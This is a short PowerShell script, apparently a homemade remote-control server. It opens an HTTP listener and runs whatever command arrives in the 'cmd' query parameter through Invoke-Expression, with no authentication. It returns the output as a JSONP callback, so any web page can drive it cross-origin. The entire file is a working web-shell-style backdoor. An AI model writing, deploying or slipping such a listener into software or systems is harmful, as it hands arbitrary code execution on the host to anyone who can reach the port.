$http = New-Object System.Net.HttpListener
$http.Prefixes.Add( "http://$($env:computername):$($args[0])/" )
$http.Start()

while (1) {

    "Listening...."

    $ctx = $http.GetContext()
    
    $res = "Gimme Powershell Please!"  
    
    $ctx.Request.RawUrl
    $ctx.Request.QueryString
    
    $query = $ctx.Request.QueryString;
    
    if ( $query[ "cmd" ] ) {
        
        $error.clear()        
        $query[ "cmd" ]
        
        $res = iex $query[ "cmd" ] | Out-String
        
        if($error) {            
            $res = $error | Out-String            
        }
    }

    $func = $query['callback']   
    
    $res = $res -replace "\\", "\\" -replace "\r\n", "\n" -replace "'", '"'   
    $res = "$func('" + $res + "');"
    
    $buffer = [System.Text.Encoding]::UTF8.GetBytes($res)
    
    $ctx.Response.Headers[ "Content-Type" ] = "text/javascript";
    
    $ctx.Response.OutputStream.Write( $buffer, 0, $buffer.Length )
    $ctx.Response.OutputStream.Close()
    
    "Done"
  
}